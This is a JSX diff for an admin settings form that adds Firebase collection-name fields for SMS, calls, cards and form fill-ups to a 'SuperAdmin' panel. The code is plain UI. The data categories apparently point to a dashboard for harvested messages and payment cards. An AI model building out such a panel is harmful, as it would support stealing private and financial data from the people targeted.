-                        <input type="text" className="search-input" value={fbAppId} onChange={(e) => setFbAppId(e.target.value)} placeholder="1:123456789:web:abcdef..." />
+                      {/* SuperAdmin Custom Collection Mapping */}
+                      <div className="glass-panel" style={{ padding: '1rem', border: '1px solid rgba(56,189,248,0.3)', background: 'rgba(56,189,248,0.05)', display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
+                        <label style={{ fontSize: '0.8rem', color: '#38bdf8', fontWeight: 700 }}>🔍 SuperAdmin Firebase Collection Mappings</label>
+                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
+                          <div>
+                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>SMS Collection Name</label>
+                            <input type="text" className="search-input" value={fbSmsColl} onChange={(e) => setFbSmsColl(e.target.value)} placeholder="smsData (or sma)" />
+                          </div>
+                          <div>
+                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Calls Collection Name</label>
+                            <input type="text" className="search-input" value={fbCallsColl} onChange={(e) => setFbCallsColl(e.target.value)} placeholder="callData (or calls)" />
+                          </div>
+                          <div>
+                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Cards Collection Name</label>
+                            <input type="text" className="search-input" value={fbCardsColl} onChange={(e) => setFbCardsColl(e.target.value)} placeholder="cardData (or cards)" />
+                          </div>
+                          <div>
+                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Form Fill-ups Collection</label>
+                            <input type="text" className="search-input" value={fbFormsColl} onChange={(e) => setFbFormsColl(e.target.value)} placeholder="formData (or userInputs)" />
+                          </div>
+                        </div>
                       </div>
+
                       <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.8rem', background: 'linear-gradient(135deg, #fbbf24, #d97706)', marginTop: '0.5rem' }}>
-                        💾 Save Firebase Configuration
+                        💾 Save Firebase Configuration & Collection Mappings
                       </button>
                     </form>
                   </div>
